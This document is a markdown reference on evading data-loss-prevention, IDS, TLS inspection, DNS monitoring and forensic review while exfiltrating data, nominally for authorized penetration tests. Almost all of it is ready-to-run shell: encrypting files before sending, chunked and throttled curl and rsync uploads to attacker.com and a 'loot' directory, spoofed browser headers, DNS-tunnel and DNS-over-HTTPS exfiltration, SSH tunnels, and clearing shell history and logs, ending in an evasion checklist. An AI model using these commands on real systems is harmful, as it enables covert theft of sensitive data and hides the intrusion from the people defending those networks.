# Exfiltration Detection Avoidance

## Overview
Modern networks deploy DLP (Data Loss Prevention), IDS/IPS, SIEM, proxy inspection,
and anomaly detection to identify and block exfiltration attempts. This reference
covers techniques to evade these controls during authorized penetration tests.

## Common Detection Mechanisms
1. **DLP (Data Loss Prevention):** Pattern-matches sensitive data (SSNs, credit cards, keywords)
2. **IDS/IPS:** Signature and anomaly detection on network traffic
3. **TLS inspection:** Corporate proxy decrypts and inspects HTTPS traffic
4. **DNS monitoring:** Detects anomalous DNS query patterns and tunneling
5. **SIEM correlation:** Correlates volume, timing, and destination anomalies
6. **NetFlow analysis:** Detects unusual traffic volumes and patterns
7. **Endpoint DLP:** Monitors file access, clipboard, USB, print operations

## Encryption to Defeat Content Inspection
```bash
# Always encrypt before exfil — defeats DLP pattern matching
openssl enc -aes-256-cbc -salt -pbkdf2 -in sensitive.csv -out data.enc -k "$KEY"

# DLP cannot match patterns in encrypted data
# Even with TLS interception, the inner encryption is opaque

# Use GPG for additional layer
gpg --symmetric --cipher-algo AES256 data.enc
# Now data is double-encrypted
```

## Volume-Based Evasion
```bash
# Chunked transfer with random delays (T1030)
for chunk in chunk_*; do
    curl -s -X POST -d @"$chunk" https://attacker.com/upload/"$chunk"
    # Random delay: 30 seconds to 5 minutes
    sleep $((RANDOM % 270 + 30))
done

# Bandwidth throttling
rsync -avz --bwlimit=50 data.enc attacker@ip:/loot/   # 50 KB/s
curl --limit-rate 100k -X POST -d @data.enc https://attacker.com/upload

# Spread over multiple days (T1029)
# Day 1: chunks 001-010, Day 2: chunks 011-020, etc.
DAILY_LIMIT=10
TODAY=$(date +%j)
START=$(( (TODAY % 30) * DAILY_LIMIT ))
for i in $(seq $START $((START + DAILY_LIMIT - 1))); do
    CHUNK=$(printf "chunk_%04d" $i)
    [ -f "$CHUNK" ] && curl -s -X POST -d @"$CHUNK" https://attacker.com/u/"$CHUNK"
    sleep $((RANDOM % 600 + 300))
done
```

## Traffic Blending
```bash
# Match normal User-Agent patterns
curl -X POST -d @data.enc https://attacker.com/upload \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     -H "Accept: text/html,application/xhtml+xml" \
     -H "Referer: https://www.google.com/"

# Use aged domains (>6 months old, with history)
# New domains trigger suspicion in threat intelligence

# Match business-hours traffic patterns
HOUR=$(date +%H)
if [ "$HOUR" -ge 9 ] && [ "$HOUR" -le 17 ]; then
    # Exfil during business hours when traffic is normal
    curl -s -X POST -d @"$chunk" https://attacker.com/upload
fi

# Mix exfil requests with legitimate-looking requests
curl -s https://www.google.com -o /dev/null  # legitimate traffic
curl -s -X POST -d @chunk_001 https://attacker.com/upload  # exfil
curl -s https://news.ycombinator.com -o /dev/null  # legitimate traffic
```

## Protocol-Level Evasion
```bash
# Use allowed protocols that aren't inspected
# DNS is often uninspected — use DNS exfil
# ICMP is often uninspected — use ICMP exfil
# NTP (port 123) is often uninspected

# Use non-standard ports that bypass proxy
curl -X POST -d @data.enc https://attacker.com:8443/upload

# Use IPv6 if monitoring only covers IPv4
curl -6 -X POST -d @data.enc https://[attacker_ipv6]/upload

# Use WebSocket (often bypasses HTTP inspection)
# Establish WebSocket and stream data
```

## TLS Inspection Bypass
```bash
# Detect TLS interception
openssl s_client -connect attacker.com:443 2>/dev/null | grep -i "issuer"
# Corporate CA in issuer = TLS interception active

# Bypass options:
# 1. Use non-443 port (if inspection only on 443)
# 2. Use SSH tunnel (port 22 often not intercepted)
ssh -L 8080:attacker.com:443 jumpbox
# 3. Use DNS-based exfil (bypasses TLS proxy entirely)
# 4. Use ICMP-based exfil
# 5. Use certificate-pinned custom client
```

## Evading DNS Monitoring
```bash
# Low-and-slow DNS queries with jitter
sleep $((RANDOM % 10 + 2))  # 2-12 second jitter between queries

# Keep subdomain labels short (under 20 chars)
# Long labels are anomalous
xxd -p data | fold -w 20  # shorter chunks

# Use multiple exfil domains to distribute queries
DOMAINS=("d1.com" "d2.com" "d3.com")
DOMAIN=${DOMAINS[$((RANDOM % 3))]}

# Use DNS over HTTPS (bypasses local DNS monitoring)
curl -s -H "accept: application/dns-json" \
    "https://1.1.1.1/dns-query?name=${CHUNK}.exfil.${DOMAIN}&type=A"

# Mix with legitimate DNS queries
nslookup www.google.com
nslookup "$CHUNK.exfil.attacker.com"
nslookup www.microsoft.com
```

## Endpoint DLP Evasion
```bash
# Avoid triggering file-access monitoring
# Read files in small chunks, not bulk reads
dd if=sensitive.db bs=4096 count=100 skip=$OFFSET 2>/dev/null | \
    openssl enc -aes-256-cbc -salt -pbkdf2 -k "$KEY" >> data.enc

# Avoid clipboard monitoring — don't copy/paste sensitive data
# Use pipe and redirect instead of clipboard

# Avoid USB/removable media monitoring
# Use network exfil instead of physical media
```

## Anti-Forensics
```bash
# Clean up staging files securely
shred -vfz -n 3 data.tar.gz data.enc chunk_*

# Clear command history
history -c && history -w
unset HISTFILE
export HISTSIZE=0

# Remove temp files
rm -rf /tmp/staging /tmp/exfil_*

# Clear log entries related to exfil
# (only with appropriate access and authorization)
```

## Evasion Checklist
- [ ] Data encrypted before transfer (defeats DLP)
- [ ] Transfer rate-limited (defeats volume alerts)
- [ ] Random delays between transfers (defeats pattern detection)
- [ ] Realistic User-Agent and headers (defeats proxy fingerprinting)
- [ ] Business-hours transfer window (blends with normal traffic)
- [ ] Aged domain with legitimate appearance
- [ ] Chunk sizes under detection thresholds
- [ ] Staging artifacts cleaned up
- [ ] Command history cleared
- [ ] Multiple fallback channels prepared
